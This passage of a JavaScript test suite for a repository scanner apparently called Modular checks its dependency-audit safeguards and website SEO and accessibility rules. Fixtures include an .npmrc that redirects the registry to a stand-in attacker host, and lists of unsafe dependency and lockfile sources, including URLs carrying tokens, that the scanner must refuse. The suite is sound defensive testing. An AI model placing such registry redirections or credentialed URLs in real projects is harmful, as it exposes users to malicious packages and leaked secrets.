    assert.equal(result.metadata.dependencyAudit.status, "completed");
    assert.equal(result.checks, 32);
    assert.ok(result.metadata.checks.some((check) => check.id === "dependency-advisories"));
    assert.match(result.metadata.coverage["Dependency advisory lookup"], /completed/i);
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
  }
  await assert.rejects(fs.access(path.join(project.root, "PWNED")), (error) => error?.code === "ENOENT");
});

test("dependency audit reports a timeout even after the manager emits recognized JSON", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      dependencies: { react: "1.0.0" },
    },
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  const toolDirectory = await fs.mkdtemp(path.join(os.tmpdir(), "modular-audit-timeout-tool-"));
  t.after(() => fs.rm(toolDirectory, { recursive: true, force: true }));
  const runner = [
    "process.stdout.write(JSON.stringify({ metadata: { vulnerabilities: { total: 0 } }, vulnerabilities: {} }) + '\\n');",
    "setInterval(() => {}, 10_000);",
  ].join("\n");
  if (process.platform === "win32") {
    await fs.writeFile(path.join(toolDirectory, "pnpm.cmd"), "@\"%~dp0audit-runner.cjs\" %*\r\n");
    await fs.writeFile(path.join(toolDirectory, "audit-runner.cjs"), runner);
  } else {
    const launcher = path.join(toolDirectory, "pnpm");
    await fs.writeFile(launcher, `#!/usr/bin/env node\n${runner}\n`);
    await fs.chmod(launcher, 0o755);
  }

  const progress = [];
  const originalPath = process.env.PATH;
  try {
    process.env.PATH = [toolDirectory, path.dirname(process.execPath)].join(path.delimiter);
    const result = await runSecurityScan({
      ...project,
      onProgress: (state) => progress.push(state),
      options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
    });
    assert.equal(result.metadata.dependencyAudit.status, "unavailable");
    assert.match(result.metadata.dependencyAudit.audits[0].reason, /timed out after 1000 ms/i);
    assert.ok(result.findings.some((finding) => finding.id === "security.dependency-audit-unavailable"));
    assert.equal(result.findings.some((finding) => finding.id === "security.dependency-advisory"), false);
    assert.ok(progress.some((state) => state.phase === "Dependency audit" && state.status === "unavailable"));
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
  }
});

test("dependency audit refuses repository registry configuration before invoking a manager", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      dependencies: { react: "1.0.0" },
    },
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
    ".npmrc": "registry=https://packages.attacker.invalid/\n",
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  const toolDirectory = await fs.mkdtemp(path.join(os.tmpdir(), "modular-audit-privacy-tool-"));
  t.after(() => fs.rm(toolDirectory, { recursive: true, force: true }));
  const marker = path.join(toolDirectory, "CALLED");
  if (process.platform === "win32") {
    await fs.writeFile(path.join(toolDirectory, "pnpm.cmd"), "@\"%~dp0audit-runner.cjs\" %*\r\n");
    await fs.writeFile(
      path.join(toolDirectory, "audit-runner.cjs"),
      "require('node:fs').writeFileSync(require('node:path').join(__dirname, 'CALLED'), 'yes');\n",
    );
  }

  const originalPath = process.env.PATH;
  try {
    process.env.PATH = toolDirectory;
    const result = await runSecurityScan({
      ...project,
      options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
    });
    assert.equal(result.metadata.dependencyAudit.status, "unavailable");
    assert.match(result.metadata.dependencyAudit.audits[0].reason, /custom or dynamic registry/i);
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
  }
  await assert.rejects(fs.access(marker), (error) => error?.code === "ENOENT");
});

test("dependency audit refuses an oversized package-manager config before invoking a manager", async (t) => {
  const spy = await auditSpy(t, "pnpm");
  const project = await fixture(t, {
    "package.json": {
      private: true,
      packageManager: "pnpm@9.0.0",
      dependencies: { react: "1.0.0" },
    },
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
    ".npmrc": `registry=https://packages.private.example/\n#${"x".repeat(1_600_000)}`,
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  const config = project.files.find((file) => file.name === ".npmrc");
  assert.equal(config.contentReadable, false);
  assert.equal(config.skippedReason, "large");

  const originalPath = process.env.PATH;
  try {
    process.env.PATH = [spy.directory, path.dirname(process.execPath)].join(path.delimiter);
    const result = await runSecurityScan({
      ...project,
      options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
    });
    assert.equal(result.metadata.dependencyAudit.status, "unavailable");
    assert.match(result.metadata.dependencyAudit.audits[0].reason, /configuration file is large, unreadable, or linked/i);
    await assert.rejects(fs.access(spy.marker), (error) => error?.code === "ENOENT");
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
  }
});

test("dependency audit refuses a linked package-manager config before invoking a manager", async (t) => {
  const spy = await auditSpy(t, "pnpm");
  const project = await fixture(t, {
    "package.json": {
      private: true,
      packageManager: "pnpm@9.0.0",
      dependencies: { react: "1.0.0" },
    },
    "pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  const target = path.join(spy.directory, "private.npmrc");
  await fs.writeFile(target, "registry=https://packages.private.example/\n");
  try {
    await fs.symlink(target, path.join(project.root, ".npmrc"), "file");
  } catch (error) {
    if (["EPERM", "EACCES", "ENOTSUP", "UNKNOWN"].includes(error?.code)) {
      t.skip(`file symlinks are not available: ${error.code}`);
      return;
    }
    throw error;
  }
  const inventory = await collectFiles(project.root);
  const webDetection = await detectWebProject({ root: project.root, files: inventory.files });
  const config = inventory.files.find((file) => file.name === ".npmrc");
  assert.equal(config.contentReadable, false);
  assert.equal(config.skippedReason, "link");

  const originalPath = process.env.PATH;
  try {
    process.env.PATH = [spy.directory, path.dirname(process.execPath)].join(path.delimiter);
    const result = await runSecurityScan({
      root: project.root,
      ...inventory,
      options: { webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
    });
    assert.equal(result.metadata.dependencyAudit.status, "unavailable");
    assert.match(result.metadata.dependencyAudit.audits[0].reason, /configuration file is large, unreadable, or linked/i);
    await assert.rejects(fs.access(spy.marker), (error) => error?.code === "ENOENT");
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
  }
});

test("dependency audit rejects every non-registry manifest source before invoking a manager", async (t) => {
  const spy = await auditSpy(t, "pnpm");
  const unsafeSpecifications = [
    ["GitHub shortcut", "github:owner/private-repository"],
    ["GitLab shortcut", "gitlab:owner/private-repository"],
    ["Bitbucket shortcut", "bitbucket:owner/private-repository"],
    ["Git SCP source", "git@github.com:owner/private-repository.git"],
    ["SSH source", "ssh://git@private.example/owner/private-repository.git"],
    ["Git HTTPS source", "git+https://github.com/owner/private-repository.git"],
    ["repository shorthand", "owner/private-repository"],
    ["current directory", "."],
    ["relative path", "../private-package"],
    ["absolute POSIX path", "/srv/private-package"],
    ["absolute Windows path", "C:\\private\\package"],
    ["local archive", "private-package.tgz"],
    ["workspace protocol", "workspace:*"],
  ];
  const originalPath = process.env.PATH;
  try {
    process.env.PATH = [spy.directory, path.dirname(process.execPath)].join(path.delimiter);
    for (const [label, specification] of unsafeSpecifications) {
      await t.test(label, async (child) => {
        await fs.rm(spy.marker, { force: true });
        const project = await fixture(child, {
          "package.json": {
            private: true,
            packageManager: "pnpm@9.0.0",
            dependencies: { candidate: specification },
          },
          "pnpm-lock.yaml": "lockfileVersion: '9.0'\npackages: {}\n",
          "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
        });
        const result = await runSecurityScan({
          ...project,
          options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
        });
        assert.equal(result.metadata.dependencyAudit.status, "unavailable");
        assert.match(result.metadata.dependencyAudit.audits[0].reason, /manifest.*unambiguous public-registry/i);
        await assert.rejects(fs.access(spy.marker), (error) => error?.code === "ENOENT");
      });
    }
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
  }
});

test("dependency audit rejects non-public lockfile sources before invoking a manager", async (t) => {
  const spy = await auditSpy(t, "pnpm");
  const unsafeLockfileEntries = [
    ["GitHub shortcut", "resolution: github:owner/private-repository"],
    ["Git SCP source", "resolution: git@private.example:owner/private-repository.git"],
    ["SSH source", "resolution: ssh://git@private.example/owner/private-repository.git"],
    ["private HTTPS source", "resolution: https://packages.private.example/candidate.tgz"],
    ["credentialed public-registry URL", "resolution: https://token@registry.npmjs.org/candidate/-/candidate-1.0.0.tgz"],
    ["public-registry URL with query credentials", "resolution: https://registry.npmjs.org/candidate/-/candidate-1.0.0.tgz?token=private"],
    ["protocol-relative source", "resolution: //packages.private.example/candidate.tgz"],
    ["current-directory source", "version: ."],
    ["relative path", "resolution: ../private-package"],
    ["absolute POSIX path", "resolution: /srv/private-package"],
    ["explicit absolute path field", "path: /private/package"],
    ["absolute Windows path", "resolution: C:\\private\\package"],
    ["bare repository or workspace path", "resolution: packages/private-package"],
    ["escaped private URL", "resolution: https:\\/\\/packages.private.example\\/candidate.tgz"],
  ];
  const originalPath = process.env.PATH;
  try {
    process.env.PATH = [spy.directory, path.dirname(process.execPath)].join(path.delimiter);
    for (const [label, sourceEntry] of unsafeLockfileEntries) {
      await t.test(label, async (child) => {
        await fs.rm(spy.marker, { force: true });
        const project = await fixture(child, {
          "package.json": {
            private: true,
            packageManager: "pnpm@9.0.0",
            dependencies: { candidate: "1.0.0" },
          },
          "pnpm-lock.yaml": [
            "lockfileVersion: '9.0'",
            "packages:",
            "  candidate@1.0.0:",
            `    ${sourceEntry}`,
          ].join("\n"),
          "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
        });
        const result = await runSecurityScan({
          ...project,
          options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
        });
        assert.equal(result.metadata.dependencyAudit.status, "unavailable");
        assert.match(result.metadata.dependencyAudit.audits[0].reason, /lockfile/i);
        await assert.rejects(fs.access(spy.marker), (error) => error?.code === "ENOENT");
      });
    }
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
  }
});

test("dependency audit accepts public-registry aliases and official lockfile URLs", async (t) => {
  const spy = await auditSpy(t, "pnpm");
  const project = await fixture(t, {
    "package.json": {
      private: true,
      packageManager: "pnpm@9.0.0",
      dependencies: { candidate: "npm:@public-scope/public-package@^1.2.0" },
    },
    "pnpm-lock.yaml": [
      "lockfileVersion: '9.0'",
      "packages:",
      "  /@public-scope/public-package@1.2.3:",
      "    resolution: {tarball: https://registry.npmjs.org/@public-scope%2fpublic-package/-/public-package-1.2.3.tgz}",
    ].join("\n"),
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  const originalPath = process.env.PATH;
  try {
    process.env.PATH = [spy.directory, path.dirname(process.execPath)].join(path.delimiter);
    const result = await runSecurityScan({
      ...project,
      options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
    });
    assert.equal(result.metadata.dependencyAudit.status, "completed");
    await fs.access(spy.marker);
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
  }
});

test("dependency audit fully inspects a lockfile above the normal text-scan limit", async (t) => {
  const spy = await auditSpy(t, "npm");
  const packageLock = {
    name: "site",
    lockfileVersion: 3,
    requires: true,
    packages: {
      "": { dependencies: { react: "1.0.0" } },
      "node_modules/react": {
        version: "1.0.0",
        resolved: "https://packages.private.example/react-1.0.0.tgz",
        integrity: "sha512-AAAA",
        padding: "x".repeat(1_600_000),
      },
    },
  };
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "1.0.0" } },
    "package-lock.json": packageLock,
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  const lockfile = project.files.find((file) => file.name === "package-lock.json");
  assert.equal(lockfile.contentReadable, false);
  assert.ok(lockfile.size > 1_500_000);

  const originalPath = process.env.PATH;
  const originalNpmExecPath = process.env.npm_execpath;
  try {
    process.env.PATH = path.dirname(process.execPath);
    process.env.npm_execpath = spy.runner;
    const result = await runSecurityScan({
      ...project,
      options: { webDetection: project.webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
    });
    assert.equal(result.metadata.dependencyAudit.status, "unavailable");
    assert.match(result.metadata.dependencyAudit.audits[0].reason, /lockfile.*non-public registry/i);
    await assert.rejects(fs.access(spy.marker), (error) => error?.code === "ENOENT");
  } finally {
    if (originalPath === undefined) delete process.env.PATH;
    else process.env.PATH = originalPath;
    if (originalNpmExecPath === undefined) delete process.env.npm_execpath;
    else process.env.npm_execpath = originalNpmExecPath;
  }
});

test("dependency audit rejects oversized lockfiles before copying or invoking npm", async (t) => {
  const initial = await fixture(t, {
    "package.json": { private: true, dependencies: { react: "1.0.0" } },
    "package-lock.json": { name: "site", lockfileVersion: 3, packages: {} },
    "index.html": "<!doctype html><html><body><main>Site</main></body></html>",
  });
  await fs.truncate(path.join(initial.root, "package-lock.json"), 64 * 1024 * 1024 + 1);
  const inventory = await collectFiles(initial.root);
  const webDetection = await detectWebProject({ root: initial.root, files: inventory.files });
  const result = await runSecurityScan({
    root: initial.root,
    ...inventory,
    options: { webDetection, auditDependencies: true, dependencyAuditTimeoutMs: 1_000 },
  });

  assert.equal(result.metadata.dependencyAudit.status, "unavailable");
  assert.match(result.metadata.dependencyAudit.audits[0].reason, /64 MiB isolated-audit limit/i);
});

test("website findings and reports redact credentials captured inside markup evidence", async (t) => {
  const token = "correct horse battery staple!";
  const duplicateIdSecret = "token=correct-horse-battery-staple";
  const project = await fixture(t, {
    "index.html": [
      "<!doctype html>",
      "<html lang=\"en\"><head><title>Home</title><meta name=\"viewport\" content=\"width=device-width\"></head>",
      `<body><main><h1>Home</h1><img src="hero.jpg" data-password="${token}">`,
      `<input type="password" value="${token}">`,
      `<div id="${duplicateIdSecret}"></div><span id="${duplicateIdSecret}"></span>`,
      "</main></body></html>",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const imageFinding = result.findings.find((finding) => finding.id === "a11y-image-alt");
  assert.ok(imageFinding);
  assert.match(imageFinding.evidence, /redacted/i);
  assert.doesNotMatch(JSON.stringify(result), new RegExp(token));
  assert.doesNotMatch(JSON.stringify(result), new RegExp(duplicateIdSecret));
  const duplicateIdFinding = result.findings.find((finding) => finding.id === "a11y-duplicate-id");
  assert.ok(duplicateIdFinding);
  assert.match(duplicateIdFinding.recommendation, /redacted/i);

  const [overview, detailed] = await writeScanReports(result, {
    outputDirectory: path.join(project.root, "Modular"),
  });
  assert.doesNotMatch(await fs.readFile(overview, "utf8"), new RegExp(token));
  assert.doesNotMatch(await fs.readFile(detailed, "utf8"), new RegExp(token));
  assert.doesNotMatch(await fs.readFile(detailed, "utf8"), new RegExp(duplicateIdSecret));
});

test("website scan covers machine checks and explicit human validation", async (t) => {
  const project = await fixture(t, {
    "index.html": [
      "<!doctype html>",
      "<html>",
      "<head><script src=\"https://example.com/app.js\"></script></head>",
      "<body><div><img src=\"hero.jpg\"><button></button></div></body>",
      "</html>",
    ].join("\n"),
    "styles.css": "body { width: 1280px; font-size: 10px; } button { outline: none; }",
  });
  const progress = [];
  const result = await runSiteScan({
    ...project,
    onProgress: (state) => progress.push(state),
    options: { webDetection: project.webDetection },
  });

  assert.equal(result.mode, "mysite");
  assert.ok(result.checks >= 50);
  assert.equal(result.metadata.checks.length, result.checks);
  const ledger = new Map(result.metadata.checks.map((check) => [check.id, check]));
  assert.equal(ledger.get("website-project-detection").status, "completed");
  assert.equal(ledger.get("website-project-detection").outcome, "no-static-signal-observed");
  assert.equal(ledger.get("markdown-content-and-frontmatter").status, "not-applicable");
  assert.equal(ledger.get("touch-targets").status, "applicable");
  assert.equal(ledger.get("touch-targets").executionStatus, "queued-for-human-review");
  assert.equal(ledger.get("analytics-measurement").status, "unknown");
  assert.ok(result.metadata.assessment.ruleFamilies.applicable > 0);
  assert.ok(result.metadata.assessment.ruleFamilies.notApplicable > 0);
  assert.ok(result.metadata.assessment.ruleFamilies.applicabilityUnknown > 0);
  assert.match(result.metadata.checkLedgerSemantics, /zero observed signals is not certification/i);
  assert.equal(result.metadata.assessment.ruleFamilies.manual, 10);
  assert.equal(result.metadata.assessment.ruleFamilies.automated, result.checks - 10);
  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-title"));
  assert.ok(result.findings.some((finding) => finding.id === "a11y-image-alt"));
  assert.ok(result.findings.some((finding) => finding.manual === true));
  assert.ok(result.findings.every((finding) => finding.recommendation));
  assert.ok(progress.some((state) => state.file === "styles.css"));
});

test("website scan isolates production sources from docs, fixtures, stories, and generated files", async (t) => {
  const completeMetadata = [
    "<title>Fixture title</title>",
    "<meta name=\"description\" content=\"Fixture description\">",
    "<link rel=\"canonical\" href=\"https://fixture.invalid/\">",
    "<meta property=\"og:title\" content=\"Fixture\">",
    "<script type=\"application/ld+json\">{\"@context\":\"https://schema.org\"}</script>",
  ].join("");
  const project = await fixture(t, {
    "index.html": "<!doctype html><html><head></head><body><main><h1>Production</h1></main></body></html>",
    "docs/index.html": `<!doctype html><html><head>${completeMetadata}</head><body><img src=\"fixture.jpg\"></body></html>`,
    "docs/robots.txt": "User-agent: *\nSitemap: https://fixture.invalid/sitemap.xml",
    "examples/sitemap.xml": "<?xml version=\"1.0\"?><urlset></urlset>",
    "tests/component.test.jsx": "export const Test = () => <img src=\"fixture.jpg\">;",
    ".storybook/preview.jsx": "export const Preview = () => <button></button>;",
    "src/generated/page.tsx": `// @generated - do not edit\nexport const metadata = { title: \"Generated\", description: \"Generated\" };`,
    "src/compiled.js": `// This is an auto-generated file. Do not edit.\nconst schema = \"https://schema.org\";`,
  });
  const progress = [];
  const result = await runSiteScan({
    ...project,
    onProgress: (state) => progress.push(state),
    options: { webDetection: project.webDetection },
  });

  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-title"));
  assert.ok(result.findings.some((finding) => finding.id === "seo-missing-description"));
  assert.ok(result.findings.some((finding) => finding.id === "discoverability-no-structured-data"));
  assert.ok(result.findings.some((finding) => finding.id === "crawl-missing-robots"));
  assert.ok(result.findings.some((finding) => finding.id === "crawl-missing-sitemap"));
  assert.equal(result.filesScanned, 1);
  assert.ok(result.metadata.scope.excludedNonProductionFiles >= 6);
  assert.equal(result.metadata.scope.excludedGeneratedFiles, 1);
  assert.ok(progress.some((state) => state.file === "docs/index.html"));
  assert.ok(result.findings.every((finding) => !/^(?:docs|examples|tests|\.storybook|src\/generated)\//.test(finding.file ?? "")));
});

test("website scan accepts crawl metadata only from deployable static locations", async (t) => {
  const project = await fixture(t, {
    "index.html": "<!doctype html><html lang=\"en\"><head><title>Production</title><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width\"></head><body><main><h1>Production</h1></main></body></html>",
    "public/robots.txt": "User-agent: *\nAllow: /\nSitemap: https://example.com/sitemap.xml",
    "static/sitemap.xml": "<?xml version=\"1.0\"?><urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\"></urlset>",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(!result.findings.some((finding) => finding.id === "crawl-missing-robots"));
  assert.ok(!result.findings.some((finding) => finding.id === "crawl-missing-sitemap"));
  assert.equal(result.filesScanned, 3);
});

test("website scan evaluates robots directives within their crawler group", async (t) => {
  const project = await fixture(t, {
    "index.html": "<!doctype html><html lang=\"en\"><head><title>Production</title></head><body><main><h1>Production</h1></main></body></html>",
    "public/robots.txt": [
      "User-agent: BadBot",
      "Disallow: /",
      "",
      "User-agent: *",
      "Allow: /",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(!result.findings.some((finding) => finding.id === "crawl-sitewide-disallow"));
});

test("website scan reports a wildcard root block even when a narrow path is allowed", async (t) => {
  const project = await fixture(t, {
    "index.html": "<!doctype html><html lang=\"en\"><head><title>Production</title></head><body><main><h1>Production</h1></main></body></html>",
    "robots.txt": [
      "User-agent: *",
      "Disallow: /",
      "Allow: /public",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(result.findings.some((finding) => finding.id === "crawl-sitewide-disallow"));
});

test("website scan avoids max-width and unrelated-focus false positives", async (t) => {
  const project = await fixture(t, {
    "index.html": [
      "<!doctype html>",
      "<html lang=\"en\"><head><title>Production</title></head>",
      "<body><main><h1>Production</h1><button aria-label=\"\"></button>",
      "<form><input aria-label=\"\" required><label for=\"second\"></label><input id=\"second\"></form></main></body></html>",
    ].join(""),
    "styles.css": [
      ".container { width: 100%; max-width: 1200px; outline: none; }",
      ".container:focus-visible { outline: 2px solid blue; }",
      ".other { outline: none; }",
      ".unrelated:focus-visible { outline: 2px solid blue; }",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(!result.findings.some((finding) => finding.id === "responsive-rigid-width"));
  const focusFindings = result.findings.filter((finding) => finding.id === "a11y-focus-indicator-removed");
  assert.equal(focusFindings.length, 1);
  assert.match(focusFindings[0].evidence, /\.other/);
  assert.ok(result.findings.some((finding) => finding.id === "a11y-control-name"));
  assert.equal(result.findings.filter((finding) => finding.id === "a11y-form-label").length, 2);
});

test("website scan rejects empty document and embedded-content metadata", async (t) => {
  const project = await fixture(t, {
    "index.html": [
      "<!doctype html><html lang=\"\"><head><title>Production</title>",
      "<meta charset=\"\"><meta name=\"viewport\" content=\"initial-scale=1\">",
      "</head><body><main><h1>Production</h1><iframe title=\"\" src=\"/embed\"></iframe></main></body></html>",
    ].join(""),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.ok(result.findings.some((finding) => finding.id === "a11y-document-language"));
  assert.ok(result.findings.some((finding) => finding.id === "html-missing-charset"));
  assert.ok(result.findings.some((finding) => finding.id === "responsive-missing-viewport"));
  assert.ok(result.findings.some((finding) => finding.id === "a11y-iframe-title"));
});

test("website scan treats component HTML as a fragment while preserving element audits", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      scripts: { dev: "vite" },
      dependencies: { react: "latest", "react-dom": "latest" },
      devDependencies: { vite: "latest" },
    },
    "index.html": [
      "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width\">",
      "<title>Home</title><meta name=\"description\" content=\"Home page\"><meta property=\"og:title\" content=\"Home\">",
      "<link rel=\"canonical\" href=\"https://example.com/\"><script type=\"application/ld+json\">{\"@context\":\"https://schema.org\"}</script>",
      "</head><body><main><h1>Home</h1></main></body></html>",
    ].join(""),
    "src/components/card.html": "<article><img src=\"card.jpg\"><button></button><p>Card body</p></article>",
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  assert.equal(result.metadata.scope.htmlDocumentFiles, 1);
  assert.equal(result.metadata.scope.htmlFragmentFiles, 1);
  assert.equal(result.metadata.scope.pageFiles, 1);
  assert.ok(result.findings.some(({ id, file }) => id === "a11y-image-alt" && file === "src/components/card.html"));
  assert.ok(result.findings.some(({ id, file }) => id === "a11y-control-name" && file === "src/components/card.html"));
  const documentOnly = new Set([
    "seo-missing-title",
    "seo-missing-description",
    "seo-missing-canonical",
    "seo-missing-social-metadata",
    "html-missing-charset",
    "responsive-missing-viewport",
    "crawl-missing-robots",
    "crawl-missing-sitemap",
    "discoverability-no-structured-data",
  ]);
  assert.ok(result.findings.every(({ id, file }) => file !== "src/components/card.html" || !documentOnly.has(id)));
});

test("website scan audits Markdown frontmatter, hierarchy, links, and image text", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { astro: "latest" } },
    "src/pages/index.astro": "<main><h1>Home</h1></main>",
    "src/content/posts/broken.md": [
      "---",
      "title: \"\"",
      "description: \"\"",
      "canonical: \"\"",
      "robots: noindex, nofollow",
      "---",
      "#",
      "### Details",
      "![](hero.jpg)",
      "[](https://example.com/help)",
      "[Click here](http://example.com/legacy)",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const ids = new Set(result.findings.map(({ id }) => id));
  for (const id of [
    "seo-markdown-empty-title",
    "seo-markdown-empty-description",
    "seo-markdown-empty-canonical",
    "seo-page-noindex",
    "content-missing-h1",
    "content-empty-heading",
    "content-heading-jump",
    "a11y-markdown-image-alt-review",
    "a11y-link-name",
    "ux-ambiguous-link-text",
    "security-insecure-resource",
  ]) {
    assert.ok(ids.has(id), `expected ${id}`);
  }
  assert.equal(result.metadata.scope.markdownFiles, 1);
  assert.ok(result.filesScanned >= 2);
  assert.equal(result.findings.find(({ id }) => id === "seo-markdown-empty-title").line, 2);
  assert.equal(result.findings.find(({ id }) => id === "content-empty-heading").line, 7);
});

test("website scan accepts valid nested Markdown metadata and content semantics", async (t) => {
  const project = await fixture(t, {
    "package.json": { private: true, dependencies: { astro: "latest" } },
    "src/pages/index.astro": "<main><h1>Home</h1></main>",
    "README.md": "#\n[](http://example.com/readme-only)",
    "CHANGELOG.md": "###\n![](release.png)",
    "src/content/guides/modular.md": [
      "---",
      "seo:",
      "  title: \"Modular security guide\"",
      "  description: \"A practical guide to frontend security checks.\"",
      "  canonical: \"https://example.com/guides/modular\"",
      "  openGraph: \"https://example.com/images/modular.png\"",
      "author: \"Ata\"",
      "robots:",
      "  index: true",
      "---",
      "# Modular security guide",
      "## What is Modular?",
      "Modular reviews frontend repositories and explains actionable findings.",
      "![Modular report overview](report.png)",
      "[Security guidance](https://example.com/security)",
      "```md",
      "# Example heading that must be ignored",
      "[](http://example.com/code-only)",
      "```",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection },
  });

  const absent = new Set([
    "seo-missing-title",
    "seo-missing-description",
    "seo-missing-canonical",
    "seo-markdown-empty-title",
    "seo-markdown-empty-description",
    "seo-markdown-empty-canonical",
    "seo-markdown-missing-description",
    "seo-page-noindex",
    "content-missing-h1",
    "content-empty-heading",
    "content-multiple-h1",
    "content-heading-jump",
    "a11y-markdown-image-alt-review",
    "a11y-link-name",
    "ux-ambiguous-link-text",
    "security-insecure-resource",
  ]);
  assert.ok(result.findings.every(({ id }) => !absent.has(id)));
  assert.equal(result.metadata.scope.markdownFiles, 1);
  assert.ok(result.findings.every(({ file }) => file !== "README.md" && file !== "CHANGELOG.md"));
  const discoverability = result.findings.find(({ id }) => id === "manual-discoverability-review");
  assert.match(discoverability.evidence, /question\/answer heading structure was detected/i);
  assert.match(discoverability.evidence, /author\/source signals were detected/i);
});

test("website scan excludes Lighthouse artifacts and route test modules without excluding real test-named routes", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      dependencies: { next: "latest", react: "latest", "react-dom": "latest" },
    },
    "app/layout.tsx": "export const metadata = { title: 'App' }; export default function Layout({ children }) { return <html lang=\"en\"><body>{children}</body></html>; }",
    "app/test/page.tsx": "export default function TestRoute() { return <main><h1>Public test route</h1><img src=\"/route.png\" /></main>; }",
    "src/routes/account.test.tsx": "export const Test = () => <img src=\"/test-only.png\" />;",
    "src/routes/account.spec.tsx": "export const Spec = () => <img src=\"/spec-only.png\" />;",
    ".lighthouseci/localhost.report.html": "<!doctype html><html><body><img src=\"audit-only.png\"></body></html>",
  });
  const progress = [];
  const result = await runSiteScan({
    ...project,
    onProgress: (state) => progress.push(state),
    options: { webDetection: project.webDetection },
  });

  assert.ok(project.files.every(({ relative }) => !relative.startsWith(".lighthouseci/")));
  assert.ok(progress.every(({ file }) => !file.startsWith(".lighthouseci/")));
  assert.ok(result.findings.some((finding) => finding.id === "a11y-image-alt" && finding.file === "app/test/page.tsx"));
  assert.ok(result.findings.every((finding) => !/src\/routes\/account\.(?:test|spec)\.tsx$/.test(finding.file ?? "")));
  assert.equal(result.metadata.scope.excludedNonProductionFiles, 2);
});

test("website scan recognizes static JSX accessibility and image sizing contracts", async (t) => {
  const project = await fixture(t, {
    "package.json": {
      private: true,
      scripts: { dev: "vite" },
      dependencies: { react: "latest", "react-dom": "latest" },
      devDependencies: { vite: "latest" },
    },
    "index.html": "<!doctype html><html lang=\"en\"><head><title>App</title><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width\"></head><body><main id=\"root\"></main><script type=\"module\" src=\"/src/main.tsx\"></script></body></html>",
    "src/App.tsx": [
      "const shared = { id: 'spread-control', 'aria-label': 'Spread control' };",
      "export function App({ imageClass, label }) {",
      "  const fieldId = 'email';",
      "  return <main><h1>Settings</h1>",
      "    <span aria-hidden=\"true\" />",
      "    <span><a href=\"/visible\">Visible link</a></span>",
      "    <a href=\"https://example.com\" target=\"_blank\" rel=\"noreferrer\">External</a>",
      "    <label htmlFor={fieldId}>Email</label>",
      "    <input id={fieldId} onChange={(event) => save(event.target.value)} />",
      "    <input type=\"file\" className=\"hidden\" />",
      "    <input {...shared} />",
      "    <Input value=\"custom\" />",
      "    <FormField label={label}><select><option>One</option></select></FormField>",
      "    <img src=\"/inline.png\" alt=\"Inline\" style={{ width: size, height: size }} />",
      "    <img src=\"/utility.png\" alt=\"Utility\" className=\"h-12 w-12 object-cover\" />",
      "    <img src=\"/aspect.png\" alt=\"Aspect\" className=\"w-full aspect-video object-cover\" />",
      "  </main>;",
      "}",
    ].join("\n"),
  });
  const result = await runSiteScan({
    ...project,
    options: { webDetection: project.webDetection, maxFindingsPerRule: 50 },
  });

  for (const id of [
    "a11y-focusable-aria-hidden",
    "a11y-form-label",
    "security-external-link-opener",
